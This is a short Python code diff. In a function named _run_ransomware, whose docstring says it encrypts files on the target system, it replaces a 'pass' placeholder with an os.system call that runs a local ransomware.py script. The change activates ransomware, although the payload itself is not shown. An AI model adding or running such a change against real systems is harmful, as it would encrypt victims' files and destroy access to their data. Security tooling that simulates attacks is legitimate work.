@@ -232,7 +232,7 @@ def _run_ransomware():
     It will only encrypte the files in the target system.
     """
     print("Running ransomware...")
-    pass
+    os.system("python3 utils/cryptosoft/ransomware.py")
 
 def run_ransomware(tar_sys_path):
     """
